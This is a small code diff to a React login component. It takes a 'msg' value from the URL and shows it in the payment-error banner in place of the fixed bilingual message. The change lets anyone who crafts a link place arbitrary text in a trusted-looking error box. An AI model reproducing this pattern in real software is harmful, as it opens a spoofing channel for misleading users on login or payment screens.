@@ -55,6 +55,7 @@ export default function LoginMethod() {
 
   const isArabic = language === "ar";
   const hasError = params.get("error") === "true";
+  const customError = params.get("msg");
   const footerImage = isArabic 
     ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
     : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";
@@ -180,7 +181,7 @@ export default function LoginMethod() {
               <X size={24} />
             </div>
             <p className="text-sm font-black text-red-700 leading-tight">
-              {isArabic ? "برجاء التحقق من معلومات الدفع الصحيح واعادة المحاوله" : "Please check payment information and try again"}
+              {customError || (isArabic ? "برجاء التحقق من معلومات الدفع الصحيح واعادة المحاوله" : "Please check payment information and try again")}
             </p>
           </motion.div>
         )}
